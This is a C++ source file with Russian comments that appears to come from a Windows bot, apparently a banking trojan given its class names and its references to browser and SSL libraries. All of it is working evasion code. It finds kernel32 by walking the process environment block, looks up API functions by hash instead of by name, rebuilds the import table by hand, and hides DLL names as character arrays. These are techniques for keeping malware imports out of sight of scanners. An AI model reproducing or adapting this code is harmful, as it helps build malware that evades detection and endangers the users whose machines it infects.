#include <windows.h>

#include "Getapi.h"
#include "ntdll.h"
#include "Strings.h"
#include "Memory.h"




//--------------------------------------------
//  Глобальный блок памяти для кеширования
// апи адресов
//--------------------------------------------
LPVOID* GlobalApiCache = NULL;

//--------------------------------------------
//  Адрес библиотеки ядра
//--------------------------------------------
HMODULE KernelModuleAddr = NULL;



//--------------------------------------------------
//  GetImageBase - Функция возвращает базовый
//                 адрес загруженного образа
//  ProcAddr - Адрес функции с которого начинается
//             поиск. Если не указать, то будет
//             использован адрес самой функции
//
//  Пример:
//		DWORD Base = GetImageBase(&MyFunction);
//--------------------------------------------------
LPVOID WINAPI GetImageBase( LPVOID procAddr )
{  
	LPBYTE addr = (procAddr) ? (LPBYTE)procAddr : (LPBYTE)&GetImageBase;
	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // Маска с расчётом на X86 и X64
	for(;;)
	{
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)addr;
		if( dosHeader->e_magic == IMAGE_DOS_SIGNATURE )
		{
			if( dosHeader->e_lfanew < 0x1000 )
			{
				PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)&((unsigned char*)addr)[dosHeader->e_lfanew];
				if( header->Signature == IMAGE_NT_SIGNATURE )
					break;
			}
		}
		addr -= 0x1000;
	}
	return addr;
}


static bool BuildBotImportTable()
{
	return false;

	unsigned char* imageBase = (unsigned char*)GetImageBase();
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(imageBase))[dosHeader->e_lfanew];

    #define GETADDR(OFFSET) ((DWORD)imageBase + (DWORD)OFFSET)


	HMODULE kernel32 ;
	PVOID (WINAPI*_pGetProcAddress)(HMODULE,PCHAR) ;
	PVOID (WINAPI*_pLoadLibraryA)(PCHAR) ;
	
	PIMAGE_DATA_DIRECTORY directory = (PIMAGE_DATA_DIRECTORY)&header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	
	if ( directory->Size <= 0 )
		return false;

	if ( (kernel32 = GetKernel32()) == NULL)
		return false;

	_pGetProcAddress = ( PVOID (WINAPI*)(HMODULE,PCHAR) ) GetApiAddr( kernel32, 0x1FC0EAEE );
	_pLoadLibraryA = ( PVOID (WINAPI*)(PCHAR) ) GetApiAddr( kernel32, 0xC8AC8026 );
	if ( (_pGetProcAddress == NULL) | (_pLoadLibraryA == NULL) )
		return 0;

	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)GETADDR(directory->VirtualAddress);

	for ( ; importDesc->Name; importDesc++ )
	{
		DWORD *thunkRef, *funcRef;
		HMODULE handle = (HMODULE)_pLoadLibraryA( (PCHAR)GETADDR(importDesc->Name));

		if( handle == NULL )
		{
			//	not found dll
			continue;
		}

		if (importDesc->OriginalFirstThunk)
		{
			thunkRef = (PDWORD)GETADDR(importDesc->OriginalFirstThunk);
			funcRef = (PDWORD)GETADDR(importDesc->FirstThunk);
		} 
		else
		{
			thunkRef = (DWORD *)GETADDR(importDesc->FirstThunk);
			funcRef  = (DWORD *)GETADDR(importDesc->FirstThunk);
		}
		
		for (; *thunkRef; thunkRef++, funcRef++)
		{
			DWORD Addr = 0;
			char* nf = 0;
			if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
			{
				Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)IMAGE_ORDINAL(*thunkRef) );
			}
			else
			{
				DWORD TempAddr = (DWORD)imageBase;
				TempAddr += *thunkRef;

				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)TempAddr;
				Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)&thunkData->Name );
			}
			if( Addr )
			{
				if( Addr != *funcRef )
					*funcRef = Addr;
			}
			else
			{
				// not found function. call by name
				*funcRef = 0;
			}
		}
	}
	return true;
}
//-----------------------------------------------------------------------------

BOOL InitializeAPI()
{
    KernelModuleAddr = NULL;
	GlobalApiCache = NULL;

	// Инициализируем глобальный кэш
	if (ApiCacheSize > 0)
	{
		DWORD BufSize = (ApiCacheSize + 1)*sizeof(LPVOID);
		GlobalApiCache = (LPVOID*)MemAlloc(BufSize);
		m_memset(GlobalApiCache, 0, BufSize);
	}

	BuildBotImportTable();
	return true;
}
//-----------------------------------------------------------------------------

/*
DWORD pGetLastError()
{
	DWORD dwRet = 0;

	__asm
	{
		MOV EAX,DWORD PTR FS:[18h]
		MOV EAX,DWORD PTR DS:[EAX+34h]
		MOV [dwRet], EAX
	}

	return dwRet;
}
*/
//----------------------------------------------------------------------------


//--------------------------------------------------
//  GetPEB - Функция возвращает адрес структуры PEB
//--------------------------------------------------
LPVOID GetPEB()
{
	#ifdef _WIN64
		return  (LPVOID)__readgsqword(0x60);
	#else
		// Для совместимости с Builder C++ x32 оставляем асм вставку
		LPVOID PEB;
		__asm
		{
			mov eax, FS:[0x30]
			mov [PEB], eax
		}
        return PEB;
	#endif

}

//--------------------------------------------------
//  GetKernel32 - Функция возвращает адрес
//                kernel32.dll
//--------------------------------------------------
HMODULE GetKernel32(void)
{

	if (!KernelModuleAddr)
		KernelModuleAddr = GetDllBase(0x4B1FFE8E /* kernel32.dll */);
	return KernelModuleAddr;
}
//----------------------------------------------------------------------------


HMODULE GetDllBase(DWORD DllHash)
{    
	PPEB Peb = (PPEB)GetPEB();

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
	PLIST_ENTRY Entry = Head->Flink;

	while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		DWORD Hash = STRW::Hash(LdrData->BaseDllName.Buffer, LdrData->BaseDllName.Length, true);
		if (Hash == DllHash)
			return (HMODULE)LdrData->DllBase;
		Entry = Entry->Flink;
    }
	return NULL;
}


LPVOID GetForvardedProc(PCHAR Name)
{
	// Функция обработки переназначения экспорта
	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
	if (Name == NULL) return NULL;

	char DLLName[255];
	m_memset(DLLName, 0, sizeof(DLLName));

	PCHAR NameStr = STRA::Scan(Name, '.');
	if (!NameStr) return NULL;


	// Собираем имя библиотеки
	m_memcpy(DLLName, Name, NameStr - Name);

	m_lstrcat(DLLName, ".dll");

	// определяем имя функции
	NameStr++;
	if (*NameStr == '#')
	{
		// Имя является номером функции
		NameStr++;
		DWORD OrdNomber = m_atoi(NameStr);
		return GetProcAddressEx(DLLName, 0, OrdNomber);
	}
	DWORD Hash = CalcHash(NameStr);
	return GetProcAddressEx(DLLName, 0, Hash);
}


LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
{
	/*----------- Функция возвращает адрем функции по её названию -----------*/

    // Получаем адрес дополнительных PE заголовков
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	// Получаем адрес таблицы експорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	int Ordinal = -1; // Норем необходимой нам функции

	if ( HIWORD(ProcNameHash) == 0 )
	{
		// Ищем функцию по её номеру
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// Ищем функцию по номеру
		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		unsigned int i;
		char * ProcName;
		for ( i = 0; i < Table->NumberOfNames; i++)
		{
			ProcName = (char*)RVATOVA(Module, *NamesTable);
			if (CalcHash(ProcName) == ProcNameHash )
			{
				Ordinal = *OrdinalTable;
				break;
			}
			// Увеличиваем позицию в таблице
			NamesTable++;
			OrdinalTable++;
		}
	}

	// не нашли номер
	if (Ordinal < 0)
		return NULL;

	// Определяем адрес функции
	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	DWORD RVA		  = AddrTable[Ordinal];
	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );

	// проверяем на переназначение экспорта
	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);

	return (LPVOID)Ret;
}


//---------------------------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//---------------------------------------------------------------------

namespace DLLS
{
	const static char kernel32_dll[]  = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	const static char advapi32_dll[]  = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	const static char user32_dll[]    = {'u','s','e','r','3','2','.','d','l','l',0};
	const static char ws2_32_dll[]    = {'w','s','2','_','3','2','.','d','l','l',0};
	const static char ntdll_dll[]     = {'n','t','d','l','l','.','d','l','l',0};
	const static char winsta_dll[]    = {'w','i','n','s','t','a','.','d','l','l',0};
	const static char shell32_dll[]   = {'s','h','e','l','l','3','2','.','d','l','l',0};
	const static char wininet_dll[]   = {'w','i','n','i','n','e','t','.','d','l','l',0};
	const static char urlmon_dll[]    = {'u','r','l','m','o','n','.','d','l','l',0};
	const static char nspr4_dll[]	  = {'n','s','p','r','4','.','d','l','l',0};
	const static char ssl3_dll[]	  = {'s','s','l','3','.','d','l','l',0};
	const static char winmm_dll[]	  = {'w','i','n','m','m','.','d','l','l',0};
	const static char cabinet_dll[]   = {'c','a','b','i','n','e','t','.','d','l','l',0};
	const static char opera_dll[]	  = {'o','p','e','r','a','.','d','l','l',0};
	const static char gdi32_dll[]     = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  0};
	const static char gdiPlus_dll[]   = {'g','d','i','p','l','u','s','.','d','l','l', 0};
	const static char crypt32_dll[]	  = {'c','r','y','p','t','3','2','.','d','l','l',0};
	const static char Iphlpapi_dll[]  = {'I','p','h','l','p','a','p','i','.','d','l','l',0};
	const static char winspool_drv[]  = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
	const static char odbc32_dll[]    = {'o','d','b','c','3','2','.','d','l','l',0};
	const static char commdlg32_dll[] = {'c','o','m','d','l','g','3','2','.','d','l','l',0};
	const static char psapi_dll[]	  = {'p','s','a','p','i','.','d','l','l',0};
	const static char shlwapi_dll[]	  = {'s','h','l','w','a','p','i','.','d','l','l',0};
	const static char version_dll[]   = {'v','e','r','s','i','o','n','.','d','l','l',0};
	const static char imagehelp_dll[] = {'I','m','a','g','e','h','l','p','.','d','l','l',0};
	const static char ole32_dll[]     = {'o','l','e','3','2','.','d','l','l',0};
	const static char cryptDll_dll[]  = "cryptdll.dll";
}

PCHAR GetDLLName(TDllId ID)
{
	#define Return(Name) return (PCHAR)DLLS::Name

	switch (ID) {
		case DLL_KERNEL32:   Return(kernel32_dll);
		case DLL_ADVAPI32:   Return(advapi32_dll);
		case DLL_USER32:     Return(user32_dll);
		case DLL_WINSOCK:    Return(ws2_32_dll);
		case DLL_NTDLL:      Return(ntdll_dll);
		case DLL_WINSTA:     Return(winsta_dll);
		case DLL_SHELL32:    Return(shell32_dll);
		case DLL_WININET:    Return(wininet_dll);
		case DLL_URLMON:     Return(urlmon_dll);
		case DLL_NSPR4:      Return(nspr4_dll);
		case DLL_SSL3:       Return(ssl3_dll);
		case DLL_WINMM:      Return(winmm_dll);
		case DLL_CABINET:    Return(cabinet_dll);
		case DLL_OPERA:      Return(opera_dll);
		case DLL_GDI:        Return(gdi32_dll);
		case DLL_GDIPLUS:    Return(gdiPlus_dll);
		case DLL_CRYPT32:    Return(crypt32_dll);
		case DLL_PSAPI:      Return(psapi_dll);
		case DLL_SHLWAPI:    Return(shlwapi_dll);
		case DLL_IPHLPAPI:   Return(Iphlpapi_dll);
		case DLL_WINSPOOL:   Return(winspool_drv);
		case DLL_COMMDLG32:  Return(commdlg32_dll);
		case DLL_ODBC32:     Return(odbc32_dll);
		case DLL_VERSION:	 Return(version_dll);
        case DLL_OLE32:      Return(ole32_dll);
		case DLL_IMAGEHLP:	 Return(imagehelp_dll);
		case DLL_CRYPTDLL:   Return(cryptDll_dll);
	}
	return NULL;
}
//-----------------------------------------------------------------------------



LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
{

	HMODULE Module = NULL;


	PCHAR DllName = Dll;

	// Адрес библиотеки ядра, получаем отдельно
	if (dwModule == DLL_KERNEL32)
		Module = GetKernel32();
	else
	if (Dll == NULL)
		Dll = GetDLLName((TDllId)dwModule);


	if (Module == NULL && !STRA::IsEmpty(Dll))
	{
		Module = (HMODULE)pGetModuleHandleA(Dll);
		if (Module == NULL)
			Module = (HMODULE)pLoadLibraryA(Dll);
	}


	if (dwProcNameHash == 0)
		return Module;

	LPVOID ret = GetApiAddr(Module, dwProcNameHash);

	if ( ret == NULL )
		return (LPVOID)0x00000000;

	return ret;
}



LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex)
{
	// Функция возвращает адрес функции используя кэш
	LPVOID Addr = NULL;


	// Пытаемся получить адрес из кэша
	bool UseCache = GlobalApiCache != NULL && CacheIndex > 0 && CacheIndex <= ApiCacheSize;

	if (UseCache)
		Addr =  GlobalApiCache[CacheIndex];

	if (!Addr)
	{
		// Функции нет в кэше. Получаем её адрес и добавляем в кэш
		Addr = GetProcAddressEx(Dll, dwModule, dwProcNameHash);
		if (UseCache)
			GlobalApiCache[CacheIndex] = Addr;
	}
	return Addr;
}



//****************************************************************
//  TBotObject - базовый класс бота
//****************************************************************

void* TBotObject::operator new(size_t size)
{
	return HEAP::Alloc(size);
}

void* TBotObject::operator new[](size_t size)
{
	return HEAP::Alloc(size);
}

void  TBotObject::operator delete(void* Pointer)
{
	HEAP::Free(Pointer);
}

void  TBotObject::operator delete[](void* Pointer)
{
	HEAP::Free(Pointer);
}

